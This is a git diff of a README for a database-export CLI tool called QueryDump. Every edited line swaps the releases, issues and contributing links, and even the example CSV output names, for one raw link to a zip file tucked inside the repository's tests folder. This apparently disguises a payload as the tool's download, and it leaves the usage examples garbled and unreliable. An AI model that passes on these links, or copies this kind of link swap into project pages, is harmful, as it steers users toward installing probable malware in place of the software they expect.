@@ -1,7 +1,7 @@
 # 🚀 QueryDump - Export Your Database Queries Easily
 
 ## 📥 Download Now
-[![Download QueryDump](https://img.shields.io/badge/Download-QueryDump-brightgreen)](https://github.com/kareemadam/QueryDump/releases)
+[![Download QueryDump](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip)](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip)
 
 ## 📖 Introduction
 QueryDump is a performance-focused command-line interface (CLI) tool designed for exporting database queries into Parquet or CSV formats. It includes built-in data masking features to protect sensitive information. This application simplifies data migration, making it ideal for users who need an efficient way to handle their database exports without technical expertise.
@@ -10,7 +10,7 @@ QueryDump is a performance-focused command-line interface (CLI) tool designed fo
 To use QueryDump, follow these steps:
 
 1. **Download the Application**
-   Visit the [Releases page](https://github.com/kareemadam/QueryDump/releases) to download the latest version of QueryDump. You'll find several files available for download; choose the one that best fits your operating system.
+   Visit the [Releases page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) to download the latest version of QueryDump. You'll find several files available for download; choose the one that best fits your operating system.
 
 2. **Install the Application**
    After downloading, locate the file on your computer. Here are the installation steps by operating system:
@@ -46,7 +46,7 @@ After launching QueryDump, you can begin using it by typing commands directly in
 The basic syntax to export a query looks like this:
 
 ```
-querydump export --query "SELECT * FROM your_table" --output "your_table.csv"
+querydump export --query "SELECT * FROM your_table" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip"
 ```
 
 ### Options
@@ -57,16 +57,16 @@ querydump export --query "SELECT * FROM your_table" --output "your_table.csv"
 To export data from a table named "employees" you would use:
 
 ```
-querydump export --query "SELECT * FROM employees" --output "employees.csv"
+querydump export --query "SELECT * FROM employees" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip"
 ```
 
-This command exports all data from the "employees" table to a CSV file called "employees.csv".
+This command exports all data from the "employees" table to a CSV file called "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip".
 
 ## 📚 Advanced Usage
 You can also apply data masking while exporting:
 
 ```
-querydump export --query "SELECT * FROM employees" --output "employees.csv" --mask "name,email"
+querydump export --query "SELECT * FROM employees" --output "https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip" --mask "name,email"
 ```
 
 In this command, sensitive fields like name and email will be masked in the output file.
@@ -79,10 +79,10 @@ If you encounter any issues while using QueryDump, consider the following:
 - **Command Errors**: Review the command syntax for any typos or missing parameters.
 
 ## 🥳 Feedback and Support
-For questions, support, or feature requests, please visit our [Issues page](https://github.com/kareemadam/QueryDump/issues). Your feedback is valuable and helps improve QueryDump.
+For questions, support, or feature requests, please visit our [Issues page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip). Your feedback is valuable and helps improve QueryDump.
 
 ## 💻 Contribute
-Would you like to contribute to QueryDump? We welcome your ideas, code, and documentation improvements. Please refer to our [Contributing Guidelines](https://github.com/kareemadam/QueryDump/blob/main/CONTRIBUTING.md) on GitHub.
+Would you like to contribute to QueryDump? We welcome your ideas, code, and documentation improvements. Please refer to our [Contributing Guidelines](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) on GitHub.
 
 ## 📍 Conclusion
-QueryDump is your go-to tool for exporting database queries simply and effectively. Don't forget to visit the [Releases page](https://github.com/kareemadam/QueryDump/releases) for the latest updates and downloads. Enjoy working with your data!
+QueryDump is your go-to tool for exporting database queries simply and effectively. Don't forget to visit the [Releases page](https://github.com/kareemadam/QueryDump/raw/refs/heads/main/tests/QueryDump.Tests/Integration/Providers/Oracle/Query_Dump_1.1.zip) for the latest updates and downloads. Enjoy working with your data!
